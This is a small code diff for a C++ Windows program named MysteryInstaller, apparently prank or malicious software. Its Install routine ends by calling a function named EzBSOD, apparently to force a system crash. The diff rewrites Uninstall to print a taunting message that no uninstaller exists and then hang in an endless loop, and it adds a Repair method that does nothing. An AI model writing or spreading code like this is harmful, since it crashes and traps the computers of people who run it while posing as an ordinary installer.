@@ -5,6 +5,7 @@
 #include "EzCpp/EzHelper.h"
 #include "EzCpp/EzTokens.h"
 #include <Windows.h>
+#include <iostream>
 
 void MysteryInstaller::Install() {
     DWORD lastError = 0;
@@ -97,5 +98,12 @@ void MysteryInstaller::Install() {
     EzBSOD();
 }
 void MysteryInstaller::Uninstall() {
-    // Welp you're fucked
+    std::cout << "I hate to be a party pooper but there is not uninstaller." << std::endl;
+    std::cout << "You my friend are royally fucked." << std::endl;
+    while (true) {
+
+    }
+}
+void MysteryInstaller::Repair() {
+    return;
 }
